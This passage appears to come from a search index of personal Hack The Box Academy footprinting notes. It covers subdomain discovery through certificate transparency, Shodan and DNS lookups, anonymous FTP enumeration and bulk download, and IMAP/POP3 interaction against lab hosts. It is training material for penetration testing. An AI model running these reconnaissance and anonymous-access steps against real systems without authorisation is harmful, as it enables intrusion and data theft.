marina.inlanefreight.com marina-live.inlanefreight.com matomo.inlanefreight.com next.inlanefreight.com noc.ttn.inlanefreight.com preview.inlanefreight.com shop.inlanefreight.com smartfactory.inlanefreight.com ttn.inlanefreight.com vx.inlanefreight.com www.inlanefreight.com Identify the hosts directly accessible from the Internet and not hosted by third-party providers. hrmns@htb[/htb]$ for i in $( cat subdomainlist ) ; do host $i | grep \"has address\" | grep inlanefreight.com | cut -d \" \" -f1,4 ; done blog.inlanefreight.com 10.129.24.93 inlanefreight.com 10.129.27.33 matomo.inlanefreight.com 10.129.127.22 www.inlanefreight.com 10.129.127.33 s3-website-us-west-2.amazonaws.com 10.129.95.250 Generate a list of IP addresses with a minor adjustment to the cut command and run them through Shodan . Shodan can be used to find devices and systems permanently connected to the Internet like Internet of Things ( IoT ) Shodan - IP List hrmns@htb[/htb]$ for i in $( cat subdomainlist ) ; do host $i | grep \"has address\" | grep inlanefreight.com | cut -d \" \" -f4 >> ip-addresses.txt ; done hrmns@htb[/htb]$ for i in $( cat ip-addresses.txt ) ; do shodan host $i ; done 10.129.24.93 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-09-01T09:02:11.370085 Number of open ports: 2 Ports: 80/tcp nginx 443/tcp nginx 10.129.27.33 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-08-30T22:25:31.572717 Number of open ports: 3 Ports: 22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3) 80/tcp nginx 443/tcp nginx |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2 |-- Diffie-Hellman Parameters: Bits: 2048 Generator: 2 10.129.27.22 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-09-01T15:39:55.446281 Number of open ports: 8 Ports: 25/tcp |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3 53/tcp 53/udp 80/tcp Apache httpd 81/tcp Apache httpd 110/tcp |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2 111/tcp 443/tcp Apache httpd |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3 |-- Diffie-Hellman Parameters: Bits: 2048 Generator: 2 Fingerprint: RFC3526/Oakley Group 14 444/tcp 10.129.27.33 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-08-30T22:25:31.572717 Number of open ports: 3 Ports: 22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3) 80/tcp nginx 443/tcp nginx |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2 |-- Diffie-Hellman Parameters: Bits: 2048 Generator: 2 Display all the available DNS records where we might find more hosts. hrmns@htb[/htb]$ dig any inlanefreight.com ; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52058 ;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 65494 ;; QUESTION SECTION: ;inlanefreight.com. IN ANY ;; ANSWER SECTION: inlanefreight.com. 300 IN A 10.129.27.33 inlanefreight.com. 300 IN A 10.129.95.250 inlanefreight.com. 3600 IN MX 1 aspmx.l.google.com. inlanefreight.com. 3600 IN MX 10 aspmx2.googlemail.com. inlanefreight.com. 3600 IN MX 10 aspmx3.googlemail.com. inlanefreight.com. 3600 IN MX 5 alt1.aspmx.l.google.com. inlanefreight.com. 3600 IN MX 5 alt2.aspmx.l.google.com. inlanefreight.com. 21600 IN NS ns.inwx.net. inlanefreight.com. 21600 IN NS ns2.inwx.net. inlanefreight.com. 21600 IN NS ns3.inwx.eu. inlanefreight.com. 3600 IN TXT \"MS=ms92346782372\" inlanefreight.com. 21600 IN TXT \"atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN\" inlanefreight.com. 3600 IN TXT \"google-site-verification=O7zV5-xFh_jn7JQ31\" inlanefreight.com. 300 IN TXT \"google-site-verification=bow47-er9LdgoUeah\" inlanefreight.com. 3600 IN TXT \"google-site-verification=gZsCG-BINLopf4hr2\" inlanefreight.com. 3600 IN TXT \"logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc\" inlanefreight.com. 300 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all\" inlanefreight.com. 21600 IN SOA ns.inwx.net. hostmaster.inwx.net. 2021072600 10800 3600 604800 3600 ;; Query time: 332 msec ;; SERVER: 127.0.0.53#53(127.0.0.53) ;; WHEN: Mi Sep 01 18:27:22 CEST 2021 ;; MSG SIZE rcvd: 940 Cloud Resources \u00b6 Google Search for AWS Google Search for Azure Third-party providers domain.glass GrayHatWarfare","title":"Domain Information"},{"location":"footprinting/domain_information/#online-presence","text":"Source to find more subdomains: crt.sh Output results in JSON format Certificate Transparency hrmns@htb[/htb]$ curl -s https://crt.sh/ \\? q \\= inlanefreight.com \\& output \\= json | jq . [ { \"issuer_ca_id\": 23451835427, \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\", \"common_name\": \"matomo.inlanefreight.com\", \"name_value\": \"matomo.inlanefreight.com\", \"id\": 50815783237226155, \"entry_timestamp\": \"2021-08-21T06:00:17.173\", \"not_before\": \"2021-08-21T05:00:16\", \"not_after\": \"2021-11-19T05:00:15\", \"serial_number\": \"03abe9017d6de5eda90\" }, { \"issuer_ca_id\": 6864563267, \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\", \"common_name\": \"matomo.inlanefreight.com\", \"name_value\": \"matomo.inlanefreight.com\", \"id\": 5081529377, \"entry_timestamp\": \"2021-08-21T06:00:16.932\", \"not_before\": \"2021-08-21T05:00:16\", \"not_after\": \"2021-11-19T05:00:15\", \"serial_number\": \"03abe90104e271c98a90\" }, { ... SNIP ... Filtered by the unique subdomains: hrmns@htb[/htb]$ curl -s https://crt.sh/ \\? q \\= inlanefreight.com \\& output \\= json | jq . | grep name | cut -d \":\" -f2 | grep -v \"CN=\" | cut -d '\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u account.ttn.inlanefreight.com blog.inlanefreight.com bots.inlanefreight.com console.ttn.inlanefreight.com ct.inlanefreight.com data.ttn.inlanefreight.com *.inlanefreight.com inlanefreight.com integrations.ttn.inlanefreight.com iot.inlanefreight.com mails.inlanefreight.com marina.inlanefreight.com marina-live.inlanefreight.com matomo.inlanefreight.com next.inlanefreight.com noc.ttn.inlanefreight.com preview.inlanefreight.com shop.inlanefreight.com smartfactory.inlanefreight.com ttn.inlanefreight.com vx.inlanefreight.com www.inlanefreight.com Identify the hosts directly accessible from the Internet and not hosted by third-party providers. hrmns@htb[/htb]$ for i in $( cat subdomainlist ) ; do host $i | grep \"has address\" | grep inlanefreight.com | cut -d \" \" -f1,4 ; done blog.inlanefreight.com 10.129.24.93 inlanefreight.com 10.129.27.33 matomo.inlanefreight.com 10.129.127.22 www.inlanefreight.com 10.129.127.33 s3-website-us-west-2.amazonaws.com 10.129.95.250 Generate a list of IP addresses with a minor adjustment to the cut command and run them through Shodan . Shodan can be used to find devices and systems permanently connected to the Internet like Internet of Things ( IoT ) Shodan - IP List hrmns@htb[/htb]$ for i in $( cat subdomainlist ) ; do host $i | grep \"has address\" | grep inlanefreight.com | cut -d \" \" -f4 >> ip-addresses.txt ; done hrmns@htb[/htb]$ for i in $( cat ip-addresses.txt ) ; do shodan host $i ; done 10.129.24.93 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-09-01T09:02:11.370085 Number of open ports: 2 Ports: 80/tcp nginx 443/tcp nginx 10.129.27.33 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-08-30T22:25:31.572717 Number of open ports: 3 Ports: 22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3) 80/tcp nginx 443/tcp nginx |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2 |-- Diffie-Hellman Parameters: Bits: 2048 Generator: 2 10.129.27.22 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-09-01T15:39:55.446281 Number of open ports: 8 Ports: 25/tcp |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3 53/tcp 53/udp 80/tcp Apache httpd 81/tcp Apache httpd 110/tcp |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2 111/tcp 443/tcp Apache httpd |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, TLSv1.2, TLSv1.3 |-- Diffie-Hellman Parameters: Bits: 2048 Generator: 2 Fingerprint: RFC3526/Oakley Group 14 444/tcp 10.129.27.33 City: Berlin Country: Germany Organization: InlaneFreight Updated: 2021-08-30T22:25:31.572717 Number of open ports: 3 Ports: 22/tcp OpenSSH (7.6p1 Ubuntu-4ubuntu0.3) 80/tcp nginx 443/tcp nginx |-- SSL Versions: -SSLv2, -SSLv3, -TLSv1, -TLSv1.1, -TLSv1.3, TLSv1.2 |-- Diffie-Hellman Parameters: Bits: 2048 Generator: 2 Display all the available DNS records where we might find more hosts. hrmns@htb[/htb]$ dig any inlanefreight.com ; <<>> DiG 9.16.1-Ubuntu <<>> any inlanefreight.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52058 ;; flags: qr rd ra; QUERY: 1, ANSWER: 17, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 65494 ;; QUESTION SECTION: ;inlanefreight.com. IN ANY ;; ANSWER SECTION: inlanefreight.com. 300 IN A 10.129.27.33 inlanefreight.com. 300 IN A 10.129.95.250 inlanefreight.com. 3600 IN MX 1 aspmx.l.google.com. inlanefreight.com. 3600 IN MX 10 aspmx2.googlemail.com. inlanefreight.com. 3600 IN MX 10 aspmx3.googlemail.com. inlanefreight.com. 3600 IN MX 5 alt1.aspmx.l.google.com. inlanefreight.com. 3600 IN MX 5 alt2.aspmx.l.google.com. inlanefreight.com. 21600 IN NS ns.inwx.net. inlanefreight.com. 21600 IN NS ns2.inwx.net. inlanefreight.com. 21600 IN NS ns3.inwx.eu. inlanefreight.com. 3600 IN TXT \"MS=ms92346782372\" inlanefreight.com. 21600 IN TXT \"atlassian-domain-verification=IJdXMt1rKCy68JFszSdCKVpwPN\" inlanefreight.com. 3600 IN TXT \"google-site-verification=O7zV5-xFh_jn7JQ31\" inlanefreight.com. 300 IN TXT \"google-site-verification=bow47-er9LdgoUeah\" inlanefreight.com. 3600 IN TXT \"google-site-verification=gZsCG-BINLopf4hr2\" inlanefreight.com. 3600 IN TXT \"logmein-verification-code=87123gff5a479e-61d4325gddkbvc1-b2bnfghfsed1-3c789427sdjirew63fc\" inlanefreight.com. 300 IN TXT \"v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.24.8 ip4:10.129.27.2 ip4:10.72.82.106 ~all\" inlanefreight.com. 21600 IN SOA ns.inwx.net. hostmaster.inwx.net. 2021072600 10800 3600 604800 3600 ;; Query time: 332 msec ;; SERVER: 127.0.0.53#53(127.0.0.53) ;; WHEN: Mi Sep 01 18:27:22 CEST 2021 ;; MSG SIZE rcvd: 940","title":"Online Presence"},{"location":"footprinting/domain_information/#cloud-resources","text":"Google Search for AWS Google Search for Azure Third-party providers domain.glass GrayHatWarfare","title":"Cloud Resources"},{"location":"footprinting/ftp/","text":"vsFTPd Config File cat /etc/vsftpd.conf | grep -v \"#\" Dangerous Settings Setting Description anonymous_enable=YES Allowing anonymous login? anon_upload_enable=YES Allowing anonymous to upload files? anon_mkdir_write_enable=YES Allowing anonymous to create new directories? no_anon_password=YES Do not ask anonymous for password? anon_root=/home/username/ftp Directory for anonymous. write_enable=YES Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? vsFTPd Status ftp> status vsFTPd Detailed Output ftp> debug Debugging on (debug=1). ftp> trace Packet tracing on. ftp> ls ---> PORT 10,10,14,4,188,195 200 PORT command successful. Consider using PASV. ---> LIST 150 Here comes the directory listing. -rw-rw-r-- 1 1002 1002 8138592 Sep 14 16:54 Calender.pptx drwxrwxr-x 2 1002 1002 4096 Sep 14 17:03 Clients drwxrwxr-x 2 1002 1002 4096 Sep 14 16:50 Documents drwxrwxr-x 2 1002 1002 4096 Sep 14 16:50 Employees -rw-rw-r-- 1 1002 1002 41 Sep 14 16:45 Important Notes.txt 226 Directory send OK. Recursive Listing ftp> ls -R ---> PORT 10,10,14,4,222,149 200 PORT command successful. Consider using PASV. ---> LIST -R 150 Here comes the directory listing. .: -rw-rw-r-- 1 ftp ftp 8138592 Sep 14 16:54 Calender.pptx drwxrwxr-x 2 ftp ftp 4096 Sep 14 17:03 Clients drwxrwxr-x 2 ftp ftp 4096 Sep 14 16:50 Documents drwxrwxr-x 2 ftp ftp 4096 Sep 14 16:50 Employees -rw-rw-r-- 1 ftp ftp 41 Sep 14 16:45 Important Notes.txt -rw------- 1 ftp ftp 0 Sep 15 14:57 testupload.txt ./Clients: drwx------ 2 ftp ftp 4096 Sep 16 18:04 HackTheBox drwxrwxrwx 2 ftp ftp 4096 Sep 16 18:00 Inlanefreight Download All Available Files hrmns@htb[/htb]$ wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136 --2021-09-19 14:45:58-- ftp://anonymous:*password*@10.129.14.136/ => \u201810.129.14.136/.listing\u2019 Connecting to 10.129.14.136:21... connected. Logging in as anonymous ... Logged in! ==> SYST ... done. ==> PWD ... done. ==> TYPE I ... done. ==> CWD not needed. ==> PORT ... done. ==> LIST ... done. 12.12.1.136/.listing [ <=> ] 466 --.-KB/s in 0s 2021-09-19 14:45:58 (65,8 MB/s) - \u201810.129.14.136/.listing\u2019 saved [466] --2021-09-19 14:45:58-- ftp://anonymous:*password*@10.129.14.136/Calendar.pptx => \u201810.129.14.136/Calendar.pptx\u2019 ==> CWD not required. ==> SIZE Calendar.pptx ... done. ==> PORT ... done. ==> RETR Calendar.pptx ... done. ...SNIP... 2021-09-19 14:45:58 (48,3 MB/s) - \u201810.129.14.136/Employees/.listing\u2019 saved [119] FINISHED --2021-09-19 14:45:58-- Total wall clock time: 0,03s Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s) hrmns@htb[/htb]$ tree . . \u2514\u2500\u2500 10.129.14.136 \u251c\u2500\u2500 Calendar.pptx \u251c\u2500\u2500 Clients \u2502 \u2514\u2500\u2500 Inlanefreight \u2502 \u251c\u2500\u2500 appointments.xlsx \u2502 \u251c\u2500\u2500 contract.docx \u2502 \u251c\u2500\u2500 meetings.txt \u2502 \u2514\u2500\u2500 proposal.pptx \u251c\u2500\u2500 Documents \u2502 \u251c\u2500\u2500 appointments-template.xlsx \u2502 \u251c\u2500\u2500 contract-template.docx \u2502 \u2514\u2500\u2500 contract-template.pdf \u251c\u2500\u2500 Employees \u2514\u2500\u2500 Important Notes.txt 5 directories, 9 files Upload File ftp> put testupload.txt local: testupload.txt remote: testupload.txt ---> PORT 10,10,14,4,184,33 200 PORT command successful. Consider using PASV. ---> STOR testupload.txt 150 Ok to send data. 226 Transfer complete. Footprinting the Service hrmns@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10 .129.14.136 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST Nmap scan report for 10.129.14.136 Host is up (0.00013s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) | -rwxrwxrwx 1 ftp ftp 8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable] | drwxrwxrwx 4 ftp ftp 4096 Sep 16 17:57 Clients [NSE: writeable] | drwxrwxrwx 2 ftp ftp 4096 Sep 16 18:05 Documents [NSE: writeable] | drwxrwxrwx 2 ftp ftp 4096 Sep 16 17:24 Employees [NSE: writeable] | -rwxrwxrwx 1 ftp ftp 41 Sep 16 17:24 Important Notes.txt [NSE: writeable] |_-rwxrwxrwx 1 ftp ftp 0 Sep 15 14:57 testupload.txt [NSE: writeable] | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.4 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status Service Interaction hrmns@htb[/htb]$ nc -nv 10 .129.14.136 21 hrmns@htb[/htb]$ telnet 10 .129.14.136 21 FTP server runs with TLS/SSL encryption hrmns@htb[/htb]$ openssl s_client -connect 10 .129.14.136:21 -starttls ftp CONNECTED(00000003) Can't use SSL_get_servername depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb verify error:num=18:self signed certificate verify return:1 depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb verify return:1 --- Certificate chain 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb i:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb --- Server certificate -----BEGIN CERTIFICATE----- MIIENTCCAx2gAwIBAgIUD+SlFZAWzX5yLs2q3ZcfdsRQqMYwDQYJKoZIhvcNAQEL ...SNIP...","title":"FTP"},{"location":"footprinting/imap_pop3/","text":"Imap Commands \u00b6 Command Description 1 LOGIN username password User's login. 1 LIST \"\" * Lists all directories. 1 CREATE \"INBOX\" Creates a mailbox with a specified name. 1 DELETE \"INBOX\" Deletes a mailbox. 1 RENAME \"ToRead\" \"Important\" Renames a mailbox. 1 LSUB \"\" * Returns a subset of names from the set of names that the User has declared as being active or subscribed . 1 SELECT INBOX Selects a mailbox so that messages in the mailbox can be accessed. 1 UNSELECT INBOX Exits the selected mailbox. 1 FETCH <ID> all Retrieves data associated with a message in the mailbox. 1 FETCH (UID 1 RFC822.SIZE 167 BODY[] {167} Retrieves data associated with a message in the mailbox. 1 CLOSE Removes all messages with the Deleted flag set. 1 LOGOUT Closes the connection with the IMAP server. POP3 Commands \u00b6 Command Description USER username Identifies the user. PASS password Authentication of the user using its password. STAT Requests the number of saved emails from the server. LIST Requests from the server the number and size of all emails. RETR id Requests the server to deliver the requested email by ID. DELE id Requests the server to delete the requested email by ID. CAPA Requests the server to display the server capabilities. RSET Requests the server to reset the transmitted information. QUIT Closes the connection with the POP3 server. Dangerous Settings \u00b6 Setting Description auth_debug Enables all authentication debug logging. auth_debug_passwords This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged. auth_verbose Logs unsuccessful authentication attempts and their reasons. auth_verbose_passwords Passwords used for authentication are logged and can also be truncated. auth_anonymous_username This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. Footprinting the Service \u00b6 By default, ports 110 , 143 , 993 , and 995 are used for IMAP and POP3. The two higher ports use TLS/SSL to encrypt the communication between client and server. hrmns@htb[/htb]$ sudo nmap 10 .129.14.128 -sV -p110,143,993,995 -sC Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST Nmap scan report for 10.129.14.128 Host is up (0.00026s latency). PORT STATE SERVICE VERSION 110/tcp open pop3 Dovecot pop3d |_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 143/tcp open imap Dovecot imapd |_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1 | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 993/tcp open ssl/imap Dovecot imapd |_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1 | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 995/tcp open ssl/pop3 Dovecot pop3d |_pop3-capabilities: AUTH-RESP-CODE USER SASL(PLAIN) TOP UIDL RESP-CODES CAPA PIPELINING | ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US | Not valid before: 2021-09-19T19:44:58 |_Not valid after: 2295-07-04T19:44:58 MAC Address: 00:00:00:00:00:00 (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds We can see that the common name is mail1.inlanefreight.htb , and the email server belongs to the organization Inlanefreight , which is located in California. If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages. hrmns@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd * LIST (\\HasNoChildren) \".\" Important * LIST (\\HasNoChildren) \".\" INBOX verbose ( -v ) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server. hrmns@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v * Trying 10.129.14.128:993... * TCP_NODELAY set * Connected to 10.129.14.128 (10.129.14.128) port 993 (#0) * successfully set certificate verify locations: * CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs * TLSv1.3 (OUT), TLS handshake, Client hello (1): * TLSv1.3 (IN), TLS handshake, Server hello (2): * TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8): * TLSv1.3 (IN), TLS handshake, Certificate (11): * TLSv1.3 (IN), TLS handshake, CERT verify (15): * TLSv1.3 (IN), TLS handshake, Finished (20): * TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1): * TLSv1.3 (OUT), TLS handshake, Finished (20): * SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 * Server certificate: * subject: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb * start date: Sep 19 19:44:58 2021 GMT * expire date: Jul 4 19:44:58 2295 GMT * issuer: C=US; ST=California; L=Sacramento; O=Inlanefreight; OU=Customer Support; CN=mail1.inlanefreight.htb; emailAddress=cry0l1t3@inlanefreight.htb * SSL certificate verify result: self signed certificate (18), continuing anyway. * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * TLSv1.3 (IN), TLS handshake, Newsession Ticket (4): * old SSL session ID is stale, removing < * OK [CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN] HTB-Academy IMAP4 v.0.21.4 > A001 CAPABILITY < * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE LITERAL+ AUTH=PLAIN < A001 OK Pre-login capabilities listed, post-login capabilities have more. > A002 AUTHENTICATE PLAIN AGNyeTBsMXQzADEyMzQ= < * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE < A002 OK Logged in > A003 LIST \"\" * < * LIST (\\HasNoChildren) \".\" Important * LIST (\\HasNoChildren) \".\" Important < * LIST (\\HasNoChildren) \".\" INBOX * LIST (\\HasNoChildren) \".\" INBOX < A003 OK List completed (0.001 + 0.000 secs). * Connection #0 to host 10.129.14.128 left intact To interact with the IMAP or POP3 server over SSL, we can use openssl , as well as ncat . OpenSSL - TLS Encrypted Interaction POP3 hrmns@htb[/htb]$ openssl s_client -connect 10 .129.14.128:pop3s CONNECTED(00000003) Can't use SSL_get_servername depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify error:num=18:self signed certificate verify return:1 depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify return:1 --- Certificate chain 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb ...SNIP... --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 3CC39A7F2928B252EF2FFA5462140B1A0A74B29D4708AA8DE1515BB4033D92C2 Session-ID-ctx: Resumption PSK: 68419D933B5FEBD878FF1BA399A926813BEA3652555E05F0EC75D65819A263AA25FA672F8974C37F6446446BB7EA83F9 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - d7 86 ac 7e f3 f4 95 35-88 40 a5 b5 d6 a6 41 e4 ...~...5.@....A. 0010 - 96 6c e6 12 4f 50 ce 72-36 25 df e1 72 d9 23 94 .l..OP.r6%..r.#. 0020 - cc 29 90 08 58 1b 57 ab-db a8 6b f7 8f 31 5b ad .)..X.W...k..1[. 0030 - 47 94 f4 67 58 1f 96 d9-ca ca 56 f9 7a 12 f6 6d G..gX.....V.z..m 0040 - 43 b9 b6 68 de db b2 47-4f 9f 48 14 40 45 8f 89 C..h...GO.H.@E.. 0050 - fa 19 35 9c 6d 3c a1 46-5c a2 65 ab 87 a4 fd 5e ..5.m<.F\\.e....^ 0060 - a2 95 25 d4 43 b8 71 70-40 6c fe 6f 0e d1 a0 38 ..%.C.qp@l.o...8 0070 - 6e bd 73 91 ed 05 89 83-f5 3e d9 2a e0 2e 96 f8 n.s......>.*.... 0080 - 99 f0 50 15 e0 1b 66 db-7c 9f 10 80 4a a1 8b 24 ..P...f.|...J..$ 0090 - bb 00 03 d4 93 2b d9 95-64 44 5b c2 6b 2e 01 b5 .....+..dD[.k... 00a0 - e8 1b f4 a4 98 a7 7a 7d-0a 80 cc 0a ad fe 6e b3 ......z}......n. 00b0 - 0a d6 50 5d fd 9a b4 5c-28 a4 c9 36 e4 7d 2a 1e ..P]...\\(..6.}*. Start Time: 1632081313 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) Extended master secret: no Max Early Data: 0 --- read R BLOCK +OK twttr POP3 Server OpenSSL - TLS Encrypted Interaction IMAP hrmns@htb[/htb]$ openssl s_client -connect 10 .129.14.128:imaps CONNECTED(00000003) Can't use SSL_get_servername depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify error:num=18:self signed certificate verify return:1 depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb verify return:1 --- Certificate chain 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, OU = Customer Support, CN = mail1.inlanefreight.htb, emailAddress = cry0l1t3@inlanefreight.htb ...SNIP... --- read R BLOCK --- Post-Handshake New Session Ticket arrived: SSL-Session: Protocol : TLSv1.3 Cipher : TLS_AES_256_GCM_SHA384 Session-ID: 2B7148CD1B7B92BA123E06E22831FCD3B365A5EA06B2CDEF1A5F397177130699 Session-ID-ctx: Resumption PSK: 4D9F082C6660646C39135F9996DDA2C199C4F7E75D65FA5303F4A0B274D78CC5BD3416C8AF50B31A34EC022B619CC633 PSK identity: None PSK identity hint: None SRP username: None TLS session ticket lifetime hint: 7200 (seconds) TLS session ticket: 0000 - 68 3b b6 68 ff 85 95 7c-8a 8a 16 b2 97 1c 72 24 h;.h...|......r$ 0010 - 62 a7 84 ff c3 24 ab 99-de 45 60 26 e7 04 4a 7d b....$...E`&..J} 0020 - bc 6e 06 a0 ff f7 d7 41-b5 1b 49 9c 9f 36 40 8d .n.....A..I..6@. 0030 - 93 35 ed d9 eb 1f 14 d7-a5 f6 3f c8 52 fb 9f 29 .5........?.R..) 0040 - 89 8d de e6 46 95 b3 32-48 80 19 bc 46 36 cb eb ....F..2H...F6.. 0050 - 35 79 54 4c 57 f8 ee 55-06 e3 59 7f 5e 64 85 b0 5yTLW..U..Y.^d.. 0060 - f3 a4 8c a6 b6 47 e4 59-ee c9 ab 54 a4 ab 8c 01 .....G.Y...T.... 0070 - 56 bb b9 bb 3b f6 96 74-16 c9 66 e2 6c 28 c6 12 V...;..t..f.l(.. 0080 - 34 c7 63 6b ff 71 16 7f-91 69 dc 38 